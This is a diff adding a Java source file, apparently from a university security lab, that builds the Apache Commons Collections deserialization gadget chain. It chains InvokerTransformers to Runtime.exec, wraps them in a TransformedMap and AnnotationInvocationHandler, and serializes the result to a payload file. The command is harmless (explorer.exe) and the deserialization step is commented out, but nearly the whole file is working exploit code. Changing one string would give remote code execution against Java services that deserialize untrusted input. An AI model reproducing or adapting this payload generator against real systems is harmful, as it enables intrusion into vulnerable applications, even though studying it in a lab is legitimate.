@@ -1,0 +1,112 @@
+package fr.tp.cyber701.hack;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.EOFException;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+import javax.swing.JOptionPane;
+
+public class TransformerDemo {
+
+	public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
+        //HackMessagePane.class.getDeclaredMethod("displayMessage").invoke(null);
+        final String cmd = "c:/windows/explorer.exe";
+        final String hackFile = "hackFile.txt";
+        
+        final Transformer[] hackingTransformers = new Transformer[] {
+    			new ConstantTransformer( Runtime.class ),
+    			new InvokerTransformer( "getMethod",
+    									new Class<?>[] { String.class, Class[].class },
+    									new Object[] {"getRuntime", new Class[0] } ),
+    			new InvokerTransformer( "invoke",
+    									new Class<?>[] { Object.class, Object[].class },
+    									new Object[] { null, new Object[0] } ),
+    			
+    			// Invoke the "exec" method on the Java runtime object to execute a program whose executable file
+    			// is specified as args[ 0 ].
+    			new InvokerTransformer( "exec",
+    									new Class<?>[] { String.class },
+    									new Object[] { cmd } ),
+    			
+    		};
+        
+        final Transformer[] hackTransformers = new Transformer[] {
+    			new ConstantTransformer( HackMessagePane.class ),
+    			new InvokerTransformer( "getMethod",
+    									new Class<?>[] { String.class, Class[].class },
+    									new Object[] {"getInstance", new Class[0] } ),
+    			
+    			new InvokerTransformer( "invoke",
+    									new Class<?>[] { Object.class, Object[].class },
+    									new Object[] { null, new Object[0] } ),
+    			
+    			new InvokerTransformer( "displayMessage",
+						new Class<?>[] {  },
+						new Object[] {  } ),
+    		};
+        
+		ChainedTransformer chain = new ChainedTransformer( hackingTransformers );
+
+        Map m = new HashMap();
+        m.put( "value", "value" );
+        Map map = TransformedMap.decorate(m, null, chain );
+        
+        try {
+			
+			// The constructor of the AnnotationInvocationHandler class is of package visibility, so we must use
+			// reflectivity to instantiate it.
+			final Class<?> serializableClass = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
+			final Constructor<?> construct  = serializableClass.getDeclaredConstructor( Class.class, Map.class );
+			construct.setAccessible( true );
+			final Object annInvocationHandlerInstance = construct.newInstance( Target.class, map );
+			
+			try (
+				final ObjectOutputStream outStr = new ObjectOutputStream( new FileOutputStream( hackFile ) );
+			) {
+				outStr.writeObject( annInvocationHandlerInstance );
+			}
+		}
+		catch ( ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException | InstantiationException | IOException ex ) {
+			ex.printStackTrace();
+		}
+
+        /*ObjectInputStream objectInputStream = null;
+
+        try {
+            objectInputStream = new ObjectInputStream(new FileInputStream(hackFile));
+            Object handler =  objectInputStream.readObject();
+
+        } catch (EOFException ex) {
+        		ex.printStackTrace();
+        } catch (ClassNotFoundException e) {
+           e.printStackTrace(); 
+        } catch(IOException exc) {
+        	exc.printStackTrace();
+        } finally {
+            if (objectInputStream != null) {
+            	try {
+
+                	objectInputStream.close();
+            	} catch (IOException e) {
+            		e.printStackTrace();
+				}
+            }
+        }*/
+	}
+
+}
